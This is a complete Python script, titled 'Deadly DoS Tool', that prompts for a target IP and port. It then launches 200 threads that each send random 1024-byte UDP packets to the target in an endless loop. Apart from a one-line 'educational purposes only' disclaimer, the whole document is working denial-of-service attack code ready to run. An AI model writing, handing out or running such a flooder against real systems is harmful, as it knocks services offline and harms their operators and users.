# Deadly DoS Tool in Python
# WARNING: This code is for educational purposes only. Use at your own risk.
# Denial of Service (DoS) attack script that floods a target IP with UDP packets.

import socket
import random
import threading

def send_packet(ip, port):
    """Function to send a single packet to the target IP and port."""
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)  # Generating a random packet of 1024 bytes
    
    while True:
        try:
            client.sendto(bytes_to_send, (ip, port))
            print(f"Packet sent to {ip}:{port}")
        except Exception as e:
            print(f"Error: {e}")
            break

def main():
    ip = input("Enter the IP address to attack: ")
    try:
        port = int(input("Enter the port to attack (default 80): ") or 80)
    except ValueError:
        print("Invalid port number. Using default port 80.")
        port = 80

    print("\nStarting the DoS attack... Press Ctrl+C to stop.")

    # Spawning multiple threads to increase the intensity of the attack
    threads = []
    for i in range(200):  # Adjust the number of threads as needed
        thread = threading.Thread(target=send_packet, args=(ip, port))
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # Keeping the script running to continue the attack
    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")

if __name__ == "__main__":
    main()
